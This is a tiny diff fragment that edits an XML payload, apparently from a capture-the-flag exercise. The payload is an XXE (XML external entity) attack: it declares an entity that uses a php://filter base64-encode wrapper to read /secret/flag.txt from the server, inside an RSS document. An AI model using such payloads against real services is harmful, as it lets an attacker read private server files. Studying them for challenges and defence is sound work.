@@ -1,4 +1,4 @@
-<!DOCTYPE foo [
+<!DOCTYPE thing [
   <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/secret/flag.txt">
 ]>
 <rss version="2.0">
